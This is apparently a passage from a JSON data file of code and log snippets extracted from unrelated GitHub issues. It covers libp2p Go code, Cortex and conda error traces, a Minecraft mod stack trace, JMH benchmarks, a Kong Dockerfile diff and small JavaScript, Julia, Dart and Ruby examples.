        "logs": "`\r\nfunc main() {\r\n\tctx, cancel := context.WithCancel(context.Background())\r\n\tdefer cancel()\r\n\r\n\th1, _ := libp2p.New(ctx, libp2p.ListenAddrStrings(\"/ip4/0.0.0.0/tcp/8884\"))\r\n\th2, _ := libp2p.New(ctx, libp2p.ListenAddrStrings(\"/ip4/0.0.0.0/tcp/8881\"))\r\n\th3, _ := libp2p.New(ctx, libp2p.ListenAddrStrings(\"/ip4/0.0.0.0/tcp/8882\"))\r\n\th4, _ := libp2p.New(ctx, libp2p.ListenAddrStrings(\"/ip4/0.0.0.0/tcp/8883\"))\r\n\r\n\th1peerInfo := &peerstore.PeerInfo{\r\n\t\tID:    h1.ID(),\r\n\t\tAddrs: h1.Addrs(),\r\n\t}\r\n\th2peerInfo := &peerstore.PeerInfo{\r\n\t\tID:    h2.ID(),\r\n\t\tAddrs: h2.Addrs(),\r\n\t}\r\n\th3peerInfo := &peerstore.PeerInfo{\r\n\t\tID:    h3.ID(),\r\n\t\tAddrs: h3.Addrs(),\r\n\t}\r\n\th4peerInfo := &peerstore.PeerInfo{\r\n\t\tID:    h4.ID(),\r\n\t\tAddrs: h4.Addrs(),\r\n\t}\r\n\r\n\th1addr, _ := peerstore.InfoToP2pAddrs(h1peerInfo)\r\n\th2addr, _ := peerstore.InfoToP2pAddrs(h2peerInfo)\r\n\th3addr, _ := peerstore.InfoToP2pAddrs(h3peerInfo)\r\n\th4addr, _ := peerstore.InfoToP2pAddrs(h4peerInfo)\r\n\r\n\th1multiaddr, _ := multiaddr.NewMultiaddr(fmt.Sprintf(\"%s\", h1addr[0]))\r\n\th2multiaddr, _ := multiaddr.NewMultiaddr(fmt.Sprintf(\"%s\", h2addr[0]))\r\n\th3multiaddr, _ := multiaddr.NewMultiaddr(fmt.Sprintf(\"%s\", h3addr[0]))\r\n\th4multiaddr, _ := multiaddr.NewMultiaddr(fmt.Sprintf(\"%s\", h4addr[0]))\r\n\r\n\th1peer, _ := peerstore.InfoFromP2pAddr(h1multiaddr)\r\n\th2peer, _ := peerstore.InfoFromP2pAddr(h2multiaddr)\r\n\th3peer, _ := peerstore.InfoFromP2pAddr(h3multiaddr)\r\n\th4peer, _ := peerstore.InfoFromP2pAddr(h4multiaddr)\r\n\r\n\tif err := h1.Connect(ctx, *h2peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h1.Connect(ctx, *h3peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h1.Connect(ctx, *h4peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tif err := h2.Connect(ctx, *h1peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h2.Connect(ctx, *h3peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h2.Connect(ctx, *h4peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tif err := h3.Connect(ctx, *h1peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h3.Connect(ctx, *h2peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h3.Connect(ctx, *h4peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tif err := h4.Connect(ctx, *h1peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h4.Connect(ctx, *h2peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h4.Connect(ctx, *h3peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tfor {\r\n\t\tfmt.Println(\"my ip \", h1.Addrs())\r\n\t\tfmt.Println(\"my ip \", h2.Addrs())\r\n\t\tfmt.Println(\"my ip \", h3.Addrs())\r\n\t\tfmt.Println(\"my ip \", h4.Addrs())\r\n\t}\r\n}\r\n"
    },
    {
        "logs": "`\r\nlevel=info ts=2021-03-17T23:22:54.652031315Z caller=main.go:178 msg=\"Starting Cortex\" version=\"(version=1.4.0, branch=HEAD, revision=23554ce02)\"\r\nlevel=info ts=2021-03-17T23:22:54.652370205Z caller=server.go:225 http=[::]:8080 grpc=[::]:9095 msg=\"server listening on addresses\"\r\nlevel=error ts=2021-03-17T23:22:54.652890205Z caller=session.go:286 module=gocql client=index-read msg=\"dns error\" error=\"lookup : no such host\"\r\nlevel=error ts=2021-03-17T23:22:54.653142466Z caller=log.go:149 msg=\"error running cortex\" err=\"gocql: unable to create session: failed to resolve any of the provided hostnames\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.(*Config).session\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:126\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.NewStorageClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:226\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewIndexClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:233\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:174\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.NewStorageClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:228\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewIndexClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:233\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:174\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\nerror creating index client\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:176\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\nerror initialising module: store\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:89\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\"\r\nstream closed             \r\n"
    },
    {
        "logs": "```\r\nlevel=info ts=2021-03-17T23:22:54.652031315Z caller=main.go:178 msg=\"Starting Cortex\" version=\"(version=1.4.0, branch=HEAD, revision=23554ce02)\"\r\nlevel=info ts=2021-03-17T23:22:54.652370205Z caller=server.go:225 http=[::]:8080 grpc=[::]:9095 msg=\"server listening on addresses\"\r\nlevel=error ts=2021-03-17T23:22:54.652890205Z caller=session.go:286 module=gocql client=index-read msg=\"dns error\" error=\"lookup : no such host\"\r\nlevel=error ts=2021-03-17T23:22:54.653142466Z caller=log.go:149 msg=\"error running cortex\" err=\"gocql: unable to create session: failed to resolve any of the provided hostnames\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.(*Config).session\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:126\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.NewStorageClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:226\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewIndexClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:233\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:174\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.NewStorageClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:228\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewIndexClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:233\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:174\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\nerror creating index client\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:176\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\nerror initialising module: store\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:89\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\"\r\nstream closed             \r\n"
    },
    {
        "logs": "`\r\n\r\nIf you want, I may try to measure memory usage (but don't know how, so let me know if you are interested).\r\n\r\nThanks.\n<issue_comment>username_0: Update: \r\nIndeed, at lmax = 256 the system cannot longer allocate memory to the arrays\r\n"
    },
    {
        "logs": "`\r\nI guess its understandable because w3j takes a 3d arrray in itself and then sums it. \r\nI also think that even the symmetry of matrix may not help, the arrays are too large and factor of 2 reducing in independent elements is not a solution. \r\nNeed to do something to alleviate memory usage. If I figure something out I will report it here. \r\n\r\nThanks.\n<issue_comment>username_0: Update 2:\r\ndue to large memory usage, '3d' solution is hard to implement in real life\r\n\r\nI tried vectorize row of K matrix (function matrix_row(l1, Bp)):\r\n"
    },
    {
        "logs": "`\r\ni.e. approx 8 mins for full matrix (ignoring its symmetry).\r\n\r\n\r\n@username_1 can you please check if my function is correct?\n<issue_comment>username_1: Hi @username_0 \r\n\r\nThank you for your update.\r\nAccording to the py3nj structure, the column base function should run faster,\r\n"
    },
    {
        "logs": "`javascript\r\nvar db = itemsModel.getDB();\r\nvar trans = db.begin();\r\ntrans.update('items')\r\n     .set({status:UNAVAILABLE})\r\n     .where({id:items_ids_list,status:AVAILABLE}).exec()\r\n     .then(function(items){ \r\n         if (items.length != items_ids_list.length) {\r\n             trans.rollback(); /* send error here*/\r\n         } else trans.commit();\r\n     });\r\n"
    },
    {
        "logs": "```javascript\r\nvar db = itemsModel.getDB();\r\nvar trans = db.begin();\r\ntrans.update('items')\r\n     .set({status:UNAVAILABLE})\r\n     .where({id:items_ids_list,status:AVAILABLE}).exec()\r\n     .then(function(items){ \r\n         if (items.length != items_ids_list.length) {\r\n             trans.rollback(); /* send error here*/\r\n         } else trans.commit();\r\n     });\r\n"
    },
    {
        "logs": "`\r\n# We want to solve an AR(p) time series regression on normalized log differences of prices.\r\n# In addition, we want to fit 5 separate models at the same time, and aggregate the results\r\n# given the stream of prediction errors:\r\n# assume d, window, varx, vary, reg{i}, and swarm are OnlineStats that have all been instantiated\r\n\r\nf = @stream begin\r\n  diff(log($1) |> d) |> window\r\n  sx = lags(window) |> varx |> standardize(_)\r\n  sy = future(window) |> vary |> standardize(_)\r\n  (sx, sy) |> (reg1, reg2, reg3, reg4, reg5) |> (sy - predict(_, sx)) |> swarm\r\nend\r\n\r\nmap(f, prices)\r\n# all OnlineStats have been updated :)\r\n"
    },
    {
        "logs": "```\r\n# We want to solve an AR(p) time series regression on normalized log differences of prices.\r\n# In addition, we want to fit 5 separate models at the same time, and aggregate the results\r\n# given the stream of prediction errors:\r\n# assume d, window, varx, vary, reg{i}, and swarm are OnlineStats that have all been instantiated\r\n\r\nf = @stream begin\r\n  diff(log($1) |> d) |> window\r\n  sx = lags(window) |> varx |> standardize(_)\r\n  sy = future(window) |> vary |> standardize(_)\r\n  (sx, sy) |> (reg1, reg2, reg3, reg4, reg5) |> (sy - predict(_, sx)) |> swarm\r\nend\r\n\r\nmap(f, prices)\r\n# all OnlineStats have been updated :)\r\n"
    },
    {
        "logs": "`\r\n[Client thread/ERROR] [NotEnoughItems/]: Error dumping Bee Mutations mode: 0\r\njava.lang.NullPointerException\r\n\tat net.minecraft.item.ItemStack.func_82833_r(ItemStack.java:427) ~[add.class:?]\r\n\tat magicbees.bees.BeeMutation.getSpecialConditions(BeeMutation.java:538) ~[BeeMutation.class:?]\r\n\tat net.username_1.neiaddons.forestry.MutationDumper.dump(MutationDumper.scala:35) ~[MutationDumper.class:?]\r\n\tat net.username_1.neiaddons.forestry.MutationDumper.dump(MutationDumper.scala:18) ~[MutationDumper.class:?]\r\n\tat codechicken.nei.config.ArrayDumper.dump(ArrayDumper.java:22) ~[ArrayDumper.class:?]\r\n\tat codechicken.nei.config.DataDumper.dumpTo(DataDumper.java:66) ~[DataDumper.class:?]\r\n\tat codechicken.nei.config.DataDumper.dumpFile(DataDumper.java:41) [DataDumper.class:?]\r\n\tat codechicken.nei.config.DataDumper.mouseClicked(DataDumper.java:141) [DataDumper.class:?]\r\n\tat codechicken.nei.config.GuiOptionList$OptionScrollSlot.slotClicked(GuiOptionList.java:129) [GuiOptionList$OptionScrollSlot.class:?]\r\n\tat codechicken.core.gui.GuiScrollSlot.slotUp(GuiScrollSlot.java:129) [GuiScrollSlot.class:?]\r\n\tat codechicken.core.gui.GuiScrollPane.mouseMovedOrUp(GuiScrollPane.java:143) [GuiScrollPane.class:?]\r\n\tat codechicken.core.gui.GuiScreenWidget.func_146286_b(GuiScreenWidget.java:96) [GuiScreenWidget.class:?]\r\n\tat net.minecraft.client.gui.GuiScreen.func_146274_d(GuiScreen.java:306) [bdw.class:?]\r\n\tat codechicken.core.gui.GuiScreenWidget.func_146274_d(GuiScreenWidget.java:127) [GuiScreenWidget.class:?]\r\n\tat net.minecraft.client.gui.GuiScreen.func_146269_k(GuiScreen.java:268) [bdw.class:?]\r\n\tat net.minecraft.client.Minecraft.func_71407_l(Minecraft.java:1640) [bao.class:?]\r\n\tat net.minecraft.client.Minecraft.func_71411_J(Minecraft.java:973) [bao.class:?]\r\n\tat net.minecraft.client.Minecraft.func_99999_d(Minecraft.java:898) [bao.class:?]\r\n\tat net.minecraft.client.main.Main.main(SourceFile:148) [Main.class:?]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_51]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_51]\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_51]\r\n\tat java.lang.reflect.Method.invoke(Method.java:497) ~[?:1.8.0_51]\r\n\tat net.minecraft.launchwrapper.Launch.launch(Launch.java:135) [launchwrapper-1.11.jar:?]\r\n\tat net.minecraft.launchwrapper.Launch.main(Launch.java:28) [launchwrapper-1.11.jar:?]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_51]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_51]\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_51]\r\n\tat java.lang.reflect.Method.invoke(Method.java:497) ~[?:1.8.0_51]\r\n\tat org.multimc.onesix.OneSixLauncher.launchWithMainClass(OneSixLauncher.java:310) [NewLaunch.jar:?]\r\n\tat org.multimc.onesix.OneSixLauncher.launch(OneSixLauncher.java:394) [NewLaunch.jar:?]\r\n\tat org.multimc.EntryPoint.listen(EntryPoint.java:170) [NewLaunch.jar:?]\r\n\tat org.multimc.EntryPoint.main(EntryPoint.java:54) [NewLaunch.jar:?]\r\n"
    },
    {
        "logs": "`\r\n# With acceleration\r\n\r\nBenchmark                         Mode  Cnt      Score     Error  Units\r\nBenchmarkContains.containsLarge   avgt   40     71.862 \u00b1   5.357  ns/op\r\nBenchmarkContains.containsMedium  avgt   40  13439.161 \u00b1 340.400  ns/op\r\nBenchmarkContains.containsSmall   avgt   40     60.485 \u00b1   1.567  ns/op\r\nBenchmarkContains.containsXLarge  avgt   40     60.850 \u00b1   0.954  ns/op\r\n\r\n\r\n# Without acceleration\r\n\r\nBenchmark                         Mode  Cnt       Score      Error  Units\r\nBenchmarkContains.containsLarge   avgt   40   21987.840 \u00b1  478.695  ns/op\r\nBenchmarkContains.containsMedium  avgt   40   12561.005 \u00b1  938.193  ns/op\r\nBenchmarkContains.containsSmall   avgt   40    1579.406 \u00b1   77.845  ns/op\r\nBenchmarkContains.containsXLarge  avgt   40  141919.300 \u00b1 4259.996  ns/op\r\n"
    },
    {
        "logs": "```\r\n# With acceleration\r\n\r\nBenchmark                         Mode  Cnt      Score     Error  Units\r\nBenchmarkContains.containsLarge   avgt   40     71.862 \u00b1   5.357  ns/op\r\nBenchmarkContains.containsMedium  avgt   40  13439.161 \u00b1 340.400  ns/op\r\nBenchmarkContains.containsSmall   avgt   40     60.485 \u00b1   1.567  ns/op\r\nBenchmarkContains.containsXLarge  avgt   40     60.850 \u00b1   0.954  ns/op\r\n\r\n\r\n# Without acceleration\r\n\r\nBenchmark                         Mode  Cnt       Score      Error  Units\r\nBenchmarkContains.containsLarge   avgt   40   21987.840 \u00b1  478.695  ns/op\r\nBenchmarkContains.containsMedium  avgt   40   12561.005 \u00b1  938.193  ns/op\r\nBenchmarkContains.containsSmall   avgt   40    1579.406 \u00b1   77.845  ns/op\r\nBenchmarkContains.containsXLarge  avgt   40  141919.300 \u00b1 4259.996  ns/op\r\n"
    },
    {
        "logs": "`\r\n    error CS1002: ; expected\r\n    error CS1002: ; expected\r\n    error CS1513: } expected\r\n    error CS0201: Only assignment, call, increment, decrement, await, and new object expressions can be used as a statement\r\n"
    },
    {
        "logs": "```\r\n    error CS1002: ; expected\r\n    error CS1002: ; expected\r\n    error CS1513: } expected\r\n    error CS0201: Only assignment, call, increment, decrement, await, and new object expressions can be used as a statement\r\n"
    },
    {
        "logs": "`diff\r\ndiff --git a/_bashbrew-arches b/_bashbrew-arches\r\nindex 4581ec5..d972979 100644\r\n--- a/_bashbrew-arches\r\n+++ b/_bashbrew-arches\r\n@@ -7,4 +7,6 @@ kong:0.13-centos @ amd64\r\n kong:0.14-centos @ amd64\r\n kong:1.0rc2 @ amd64\r\n kong:1.0rc2-centos @ amd64\r\n+kong:1.0rc3 @ amd64\r\n+kong:1.0rc3-centos @ amd64\r\n kong:latest @ amd64\r\ndiff --git a/_bashbrew-list b/_bashbrew-list\r\nindex cc539b5..d059cd6 100644\r\n--- a/_bashbrew-list\r\n+++ b/_bashbrew-list\r\n@@ -23,7 +23,13 @@ kong:0.14.1-centos\r\n kong:1.0rc2\r\n kong:1.0rc2-alpine\r\n kong:1.0rc2-centos\r\n+kong:1.0rc3\r\n+kong:1.0rc3-alpine\r\n+kong:1.0rc3-centos\r\n kong:1.0.0rc2\r\n kong:1.0.0rc2-alpine\r\n kong:1.0.0rc2-centos\r\n+kong:1.0.0rc3\r\n+kong:1.0.0rc3-alpine\r\n+kong:1.0.0rc3-centos\r\n kong:latest\r\ndiff --git a/kong_1.0rc2-centos/Dockerfile b/kong_1.0rc3-centos/Dockerfile\r\nsimilarity index 47%\r\ncopy from kong_1.0rc2-centos/Dockerfile\r\ncopy to kong_1.0rc3-centos/Dockerfile\r\nindex c736934..315701f 100644\r\n--- a/kong_1.0rc2-centos/Dockerfile\r\n+++ b/kong_1.0rc3-centos/Dockerfile\r\n@@ -1,10 +1,16 @@\r\n FROM centos:7\r\n LABEL maintainer=\"Kong Core Team <team-core@konghq.com>\"\r\n \r\n-ENV KONG_VERSION 1.0.0rc2\r\n+ENV KONG_VERSION 1.0.0rc3\r\n \r\n RUN yum install -y wget https://bintray.com/kong/kong-community-edition-rpm/download_file?file_path=centos/7/kong-community-edition-$KONG_VERSION.el7.noarch.rpm && \\\r\n-    yum clean all\r\n+    yum clean all && \\\r\n+    # OpenShift specific. OpenShift runs containers using an arbitrarily assigned user ID.\r\n+    # This user doesn't have access to change file permissions during runtime, they have to be changed during image building.\r\n+    # https://docs.okd.io/latest/creating_images/guidelines.html#use-uid\r\n+    mkdir -p \"/usr/local/kong\" && \\\r\n+    chgrp -R 0 \"/usr/local/kong\" && \\\r\n+    chmod -R g=u \"/usr/local/kong\"\r\n \r\n COPY docker-entrypoint.sh /docker-entrypoint.sh\r\n ENTRYPOINT [\"/docker-entrypoint.sh\"]\r\ndiff --git a/kong_0.14-centos/docker-entrypoint.sh b/kong_1.0rc3-centos/docker-entrypoint.sh\r\nsimilarity index 100%\r\ncopy from kong_0.14-centos/docker-entrypoint.sh\r\ncopy to kong_1.0rc3-centos/docker-entrypoint.sh\r\ndiff --git a/kong_1.0rc2/Dockerfile b/kong_1.0rc3/Dockerfile\r\nsimilarity index 58%\r\ncopy from kong_1.0rc2/Dockerfile\r\ncopy to kong_1.0rc3/Dockerfile\r\nindex 4673094..dcedeae 100644\r\n--- a/kong_1.0rc2/Dockerfile\r\n+++ b/kong_1.0rc3/Dockerfile\r\n@@ -1,8 +1,8 @@\r\n FROM alpine:3.6\r\n LABEL maintainer=\"Kong Core Team <team-core@konghq.com>\"\r\n \r\n-ENV KONG_VERSION 1.0.0rc2\r\n-ENV KONG_SHA256 42eba2f0c566740472ce69aae44dd93df81a75f494f32f45285426545ba1e914\r\n+ENV KONG_VERSION 1.0.0rc3\r\n+ENV KONG_SHA256 4af1b014cb9a827149c74d3fe795fab6a96892cf07eb7bafc197d7c23b0bd2a4\r\n \r\n RUN apk add --no-cache --virtual .build-deps wget tar ca-certificates \\\r\n[Truncated]\n \t&& cp -R /tmp/etc / \\\r\n \t&& rm -rf /tmp/etc \\\r\n-\t&& apk del .build-deps\r\n+\t&& apk del .build-deps \\\r\n+\t# OpenShift specific. OpenShift runs containers using an arbitrarily assigned user ID.\r\n+\t# This user doesn't have access to change file permissions during runtime, they have to be changed during image building.\r\n+\t# https://docs.okd.io/latest/creating_images/guidelines.html#use-uid\r\n+\t&& mkdir -p \"/usr/local/kong\" \\\r\n+\t&& chgrp -R 0 \"/usr/local/kong\" \\\r\n+\t&& chmod -R g=u \"/usr/local/kong\"\r\n \r\n COPY docker-entrypoint.sh /docker-entrypoint.sh\r\n ENTRYPOINT [\"/docker-entrypoint.sh\"]\r\ndiff --git a/kong_0.14-centos/docker-entrypoint.sh b/kong_1.0rc3/docker-entrypoint.sh\r\nsimilarity index 100%\r\ncopy from kong_0.14-centos/docker-entrypoint.sh\r\ncopy to kong_1.0rc3/docker-entrypoint.sh\r\n"
    },
    {
        "logs": "```\r\n\r\nhttps://github.com/benjiebob/SMALViewer/issues/4\r\n\r\n\r\n\r\nHere's the code that is throwing error (not my code):\r\n\r\n\r\n"
    },
    {
        "logs": "`\r\ninfo \u2022 Sort constructor declarations before other members \u2022 lib/model/response/favorites_error_response.dart:41:11 \u2022 sort_constructors_first\r\n"
    },
    {
        "logs": "`\r\nvar a = 'info \u2022 Sort constructor declarations before other members \u2022 lib/model/response/favorites_error_response.dart:41:11 \u2022 sort_constructors_first'\r\n\r\na.match(/error.+\\.dart:\\d+:\\d+/)\r\n"
    },
    {
        "logs": "`\r\n[ 'error_response.dart:41:11',\r\n  index: 89,\r\n  input: 'info \u2022 Sort constructor declarations before other members \u2022 lib/model/response/favorites_error_response.dart:41:11 \u2022 sort_constructors_first',\r\n  groups: undefined ]\r\n"
    },
    {
        "logs": "```\r\ninfo \u2022 Sort constructor declarations before other members \u2022 lib/model/response/favorites_error_response.dart:41:11 \u2022 sort_constructors_first\r\n"
    },
    {
        "logs": "`)? Or should they be able to be used explicitly as indicated above?\n<issue_comment>username_1: @username_0 are you trying to *signal* the "
    },
    {
        "logs": "` method on an actor proxy\n<issue_comment>username_1: https://github.com/celluloid/celluloid/blob/master/lib/celluloid/future.rb#L102\r\nhttps://github.com/celluloid/celluloid/blob/master/lib/celluloid/future.rb#L137<issue_closed>\n<issue_comment>username_1: Please let us know if you have any problems. So far "
    },
    {
        "logs": "```ruby\r\nfuture = Celluloid::Future.new\r\nfuture.signal(1234)\r\nfuture.value #=> NoMethodError: undefined method `value' for 1234:Fixnum\r\n"
    },
    {
        "logs": "`\r\nAn unexpected error has occurred, please consider sending the                           |  54%\r\nfollowing traceback to the conda GitHub issue tracker at:\r\n\r\n    https://github.com/conda/conda/issues\r\n\r\nInclude the output of the command 'conda info' in your report.\r\n\r\n\r\nTraceback (most recent call last):\r\n  File \"/home/username_0/anaconda/bin/conda\", line 5, in <module>\r\n    \r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main.py\", line 202, in main\r\n    args_func(args, p)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main.py\", line 207, in args_func\r\n    args.func(args, p)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main_update.py\", line 40, in execute\r\n    install.install(args, parser, 'update')\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/install.py\", line 420, in install\r\n    plan.execute_actions(actions, index, verbose=not args.quiet)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/plan.py\", line 502, in execute_actions\r\n    inst.execute_instructions(plan, index, verbose)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 140, in execute_instructions\r\n    cmd(state, arg)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 84, in LINK_CMD\r\n    link(state['prefix'], arg, index=state['index'])\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 80, 